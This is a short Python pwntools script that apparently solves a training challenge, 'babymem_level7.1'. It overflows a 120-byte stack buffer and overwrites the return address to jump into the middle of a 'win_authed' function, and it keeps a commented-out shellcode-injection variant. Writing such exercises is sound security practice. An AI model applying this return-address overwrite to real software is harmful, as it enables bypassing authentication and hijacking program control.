from pwn import *

file = "/challenge/babymem_level7.1"
p = process(file)
#p = gdb.debug(file)
elf = ELF(file)
addr = elf.symbols['win_authed']
print(hex(addr+28))
num = p64(addr+28)
buffer = 120

shellcode = """
mov rdi, 0x1337
ret
"""


p.sendline(bytes(str(buffer+2), 'ascii'))

#p.sendline(b'1073741824')
p.sendline(b'A'*(buffer) + num)

print(p.recvall())
#print(disasm(asm(shellcode, os='linux', arch='amd64'), os ='linux', arch='amd64'))
"""
p.recvuntil(b'begins at ')
startaddr = p.recvuntil(b',')[:-1]
startaddr = int(startaddr, 16)
startaddr = p64(startaddr)
shellcode = asm(shellcode, os='linux', arch='amd64')
shellcode = int.from_bytes(shellcode, 'big')
shellcode = p64(shellcode)
#print("num: ", num)
#print("param1: ", param1)
print(len(shellcode))
buffer = p64(0x41)*buffer
p.sendline(b'100')
p.sendline(shellcode + buffer + param1 + startaddr + num)
"""
